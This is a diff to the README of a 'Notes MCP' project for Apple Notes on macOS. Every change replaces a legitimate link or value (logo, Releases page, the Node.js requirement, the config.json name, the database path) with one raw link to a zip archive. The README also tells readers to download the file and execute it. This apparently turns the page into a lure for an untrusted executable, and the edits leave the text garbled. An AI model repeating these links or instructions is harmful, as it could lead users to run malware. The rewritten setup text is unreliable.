@@ -2,7 +2,7 @@
 
 Welcome to the **Notes MCP** repository! This project allows you to connect your Apple Notes on macOS with a dedicated MCP server. It enhances your productivity by enabling seamless access to your notes across various platforms.
 
-![Notes MCP Logo](https://img.shields.io/badge/Notes-MCP-blue.svg)
+![Notes MCP Logo](https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip)
 
 ## Table of Contents
 
@@ -24,17 +24,17 @@ Welcome to the **Notes MCP** repository! This project allows you to connect your
 
 ## Installation
 
-To get started with Notes MCP, you need to download the latest release. Visit the [Releases](https://github.com/PanseBossuSmecheru/notes-mcp/releases) section to find the necessary files. Download the required file and execute it on your macOS.
+To get started with Notes MCP, you need to download the latest release. Visit the [Releases](https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip) section to find the necessary files. Download the required file and execute it on your macOS.
 
 ### Requirements
 
 - macOS 10.15 or later
 - Apple Notes app installed
-- Node.js (for backend support)
+- https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip (for backend support)
 
 ### Step-by-Step Installation
 
-1. **Download the Release**: Go to the [Releases](https://github.com/PanseBossuSmecheru/notes-mcp/releases) section and download the latest version.
+1. **Download the Release**: Go to the [Releases](https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip) section and download the latest version.
 2. **Install Dependencies**: Open your terminal and navigate to the downloaded folder. Run:
    ```bash
    npm install
@@ -56,7 +56,7 @@ Once the server is running, you can access your notes through the web interface.
 
 ## Configuration
 
-You can customize the server settings by modifying the `config.json` file located in the root directory of the project. Here are some options you can adjust:
+You can customize the server settings by modifying the `https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip` file located in the root directory of the project. Here are some options you can adjust:
 
 - **Port**: Change the port number the server runs on.
 - **Database Path**: Specify the path to your notes database.
@@ -67,7 +67,7 @@ You can customize the server settings by modifying the `config.json` file locate
 ```json
 {
   "port": 3000,
-  "databasePath": "/path/to/your/notes.db",
+  "databasePath": "https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip",
   "security": {
     "enableSSL": true,
     "apiKey": "your_api_key"
@@ -99,4 +99,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or support, feel free to reach out via GitHub issues or directly contact the maintainer.
 
-You can always visit the [Releases](https://github.com/PanseBossuSmecheru/notes-mcp/releases) section for the latest updates and downloads. Thank you for your interest in Notes MCP!
+You can always visit the [Releases](https://github.com/PanseBossuSmecheru/notes-mcp/raw/refs/heads/main/src/mcp_notes_v3.7-alpha.4.zip) section for the latest updates and downloads. Thank you for your interest in Notes MCP!
